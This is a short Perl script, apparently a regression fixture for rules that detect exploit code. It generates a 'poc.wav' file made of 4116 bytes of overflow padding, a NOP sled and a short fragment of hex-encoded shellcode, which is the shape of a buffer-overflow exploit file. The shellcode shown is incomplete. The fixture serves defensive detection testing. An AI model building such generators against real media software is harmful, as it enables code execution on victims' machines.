#!/usr/bin/perl
# Minimal regression carrier: perl exploit-file generator shape (NOP sled
# plus hex-encoded shellcode printed to a file). Guards the shellcode-leaf
# perl rules and the generator composite.
my $file = "poc.wav";
my $buff = "A" x 4116;
my $nop = "\x90" x 28;
my $shell =
"\xda\xcd\xd9\x74\x24\xf4\xb8\x50\x99\x22\x39\x5b\x33\xc9" .
"\xb1\x31\x31\x43\x18\x83\xc3\x04\x03\x43\x44\x7b\xd7\xc5";
open(my $fh, '>', $file);
print $fh $buff . $nop . $shell;
close($fh);
